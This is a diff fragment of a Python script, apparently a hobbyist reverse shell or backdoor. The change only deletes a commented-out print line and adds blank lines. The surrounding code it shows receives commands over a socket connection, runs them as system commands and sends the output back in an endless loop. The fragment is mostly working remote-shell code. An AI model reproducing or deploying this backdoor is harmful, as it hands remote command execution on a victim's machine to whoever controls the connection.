@@ -27,13 +27,17 @@ connection.send("\n++Connection established++\n") #python3 requires bytes-like o
 
 while True:
     command = connection.recv(buffer_size) #receive, specify buffer size
-    #print(received_data)
     command_result = execute_system_command(command)
     connection.send(command_result)
 connection.close()
 #connect method takes a tuple
 #takes IP and port arguments
 #create socket connection from host to target IP and port
+
+
+
+
+
 
 ############################################################################
 ###Commented code below###
